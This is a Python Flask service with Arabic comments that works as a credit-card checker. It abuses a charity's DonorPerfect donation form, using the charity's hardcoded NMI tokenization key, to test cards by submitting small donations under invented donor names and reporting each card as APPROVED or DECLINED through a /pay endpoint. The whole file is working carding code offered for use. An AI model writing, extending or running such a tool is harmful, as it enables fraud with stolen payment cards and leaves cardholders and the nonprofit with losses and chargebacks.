from flask import Flask, request
import requests
import json
import logging
import os
import random
import uuid
import time
from datetime import datetime
import urllib3

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

# ==================== بيانات dccca.org ====================
DCCCA_CONFIG = {
    'tokenization_key': 'U3E8Jt-aE2HV7-hn36Uu-e6j479',
    'org_id': '583a88fa-73c9-4c90-8e06-53a6df6157e7',
    'form_id': 'b9a54cff-6d7a-494d-bcea-92607f1a182c',
    'form_name': 'DCCCA Donation Form',
    'form_version': 1767811845866,
    'org_name': 'DCCCA',
}

# ==================== دالة فحص NMI ====================
def donorperfect_nmi_check(ccx, amount="1"):
    try:
        # تنظيف البطاقة
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return 'Invalid format'
        
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 2:
            yy = '20' + yy
        ccexp_value = f'{mm}{yy[2:]}'
        
        logger.info(f"💳 Card: {cc[:6]}...{cc[-4:]}")
        
        # استخدام البيانات الثابتة
        tok_key = DCCCA_CONFIG['tokenization_key']
        org_id = DCCCA_CONFIG['org_id']
        form_id = DCCCA_CONFIG['form_id']
        form_name = DCCCA_CONFIG['form_name']
        form_version = DCCCA_CONFIG['form_version']
        org_name = DCCCA_CONFIG['org_name']
        
        # إنشاء معرف فريد
        cart_id = str(uuid.uuid4())
        
        # ===== 1. إنشاء توكن NMI =====
        logger.info("🔄 Creating NMI token...")
        
        nmi_headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }
        
        try:
            create_resp = requests.post(
                'https://secure.nmi.com/token/api/create',
                headers=nmi_headers,
                data=f'tokenizationKey={tok_key}&cartCorrelationId={cart_id}',
                timeout=15
            )
        except Exception as e:
            # خطأ كود/بوابة - نرجعه كامل
            return f'Connection error: {str(e)}'
        
        if create_resp.status_code != 200:
            # خطأ بوابة - نرجعه
            return f'NMI error: {create_resp.status_code}'
        
        create_data = create_resp.json()
        token_id = create_data.get('token', '')
        
        if not token_id:
            return 'NMI error: No token'
        
        # ===== 2. حفظ بيانات البطاقة =====
        json_headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }
        
        try:
            # حفظ رقم البطاقة
            requests.post(
                'https://secure.nmi.com/token/api/save_multipart_token',
                headers=json_headers,
                json={
                    'tokenizationKey': tok_key,
                    'cartCorrelationId': cart_id,
                    'tokenId': token_id,
                    'data': [{'elementId': 'ccnumber', 'value': cc}]
                },
                timeout=15
            )
            
            # حفظ تاريخ الانتهاء
            requests.post(
                'https://secure.nmi.com/token/api/save_multipart_token',
                headers=json_headers,
                json={
                    'tokenizationKey': tok_key,
                    'cartCorrelationId': cart_id,
                    'tokenId': token_id,
                    'data': [{'elementId': 'ccexp', 'value': ccexp_value}]
                },
                timeout=15
            )
            
            # حفظ CVV
            requests.post(
                'https://secure.nmi.com/token/api/save_multipart_token',
                headers=json_headers,
                json={
                    'tokenizationKey': tok_key,
                    'cartCorrelationId': cart_id,
                    'tokenId': token_id,
                    'data': [{'elementId': 'cvv', 'value': cvv}]
                },
                timeout=15
            )
        except Exception as e:
            return f'Save error: {str(e)}'
        
        # ===== 3. استعلام عن البطاقة =====
        try:
            lookup_resp = requests.post(
                'https://secure.nmi.com/token/api/lookup',
                headers=json_headers,
                json={
                    'tokenizationKey': tok_key,
                    'cartCorrelationId': cart_id,
                    'tokenId': token_id
                },
                timeout=15
            )
        except Exception as e:
            return f'Lookup error: {str(e)}'
        
        if lookup_resp.status_code != 200:
            return f'Lookup error: {lookup_resp.status_code}'
        
        lookup_data = lookup_resp.json()
        card_info = lookup_data.get('card', {})
        
        if not card_info.get('number'):
            return 'Lookup error: No card info'
        
        # ===== 4. إعداد بيانات التبرع =====
        email = f'donor{random.randint(100, 999)}@gmail.com'
        first_name = 'John'
        last_name = 'Smith'
        now_str = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        
        submission_payload = {
            'meta-data': {
                'formId': form_id,
                'formVersion': form_version,
                'formName': form_name,
                'localDateTime': now_str,
                'hiddenFields': [],
                'organizationName': org_name,
                'organizationId': org_id,
            },
            'data': {
                'gift_amount': str(amount),
                'gift_type': 'oneTime',
                'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'address': '123 Main St',
                'city': 'New York',
                'state': 'NY',
                'zip': '10001',
                'country': 'US',
                'phone': '',
                'employer': '',
                'payment_method': 'credit_card',
            },
            'payment-data': {
                'card': card_info,
                'token': token_id,
                'cartCorrelationId': cart_id,
                'check': lookup_data.get('check', {}),
            },
            'paypal-data': {},
        }
        
        # ===== 5. إرسال التبرع =====
        submit_headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://form-renderer-app.donorperfect.io',
            'Referer': 'https://form-renderer-app.donorperfect.io/',
        }
        
        logger.info("💰 Submitting donation...")
        
        try:
            submit_resp = requests.post(
                'https://form-renderer-api.donorperfect.io/api/FormSubmission',
                headers=submit_headers,
                json=submission_payload,
                timeout=30
            )
        except Exception as e:
            return f'Submit error: {str(e)}'
        
        # تحليل الرد
        if submit_resp.status_code == 200:
            try:
                data = submit_resp.json()
                if data.get('success') is True:
                    return '✅ APPROVED'
                else:
                    # بطاقة مرفوضة - رجع Declined فقط
                    return '❌ DECLINED'
            except:
                # لو مش JSON (نادر)
                return f'Response: {submit_resp.text[:100]}'
        else:
            # خطأ بوابة - نرجعه كامل
            return f'HTTP {submit_resp.status_code}: {submit_resp.text[:100]}'
        
    except Exception as e:
        logger.exception("Error")
        return f'Error: {str(e)}'

# ==================== API Endpoints ====================
@app.route('/pay', methods=['GET'])
def pay_endpoint():
    try:
        cc = request.args.get('cc')
        price = request.args.get('price', '1')
        
        if not cc:
            return "Missing card", 400
        
        logger.info(f"🔍 Checking card: {cc[:16]}...")
        result = donorperfect_nmi_check(cc, price)
        return str(result), 200
        
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/check', methods=['GET'])
def check_endpoint():
    return "✅ NMI API is running", 200

@app.route('/', methods=['GET'])
def home():
    return check_endpoint()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 NMI API - نسخة فهمانة")
    print("="*60)
    print("📊 نظام الردود:")
    print("  ✅ APPROVED - نجاح")
    print("  ❌ DECLINED - بطاقة مرفوضة")
    print("  [أي حاجة تانية] - خطأ كود/بوابة (للتصحيح)")
    print("="*60)
    app.run(host='0.0.0.0', port=port, debug=False)
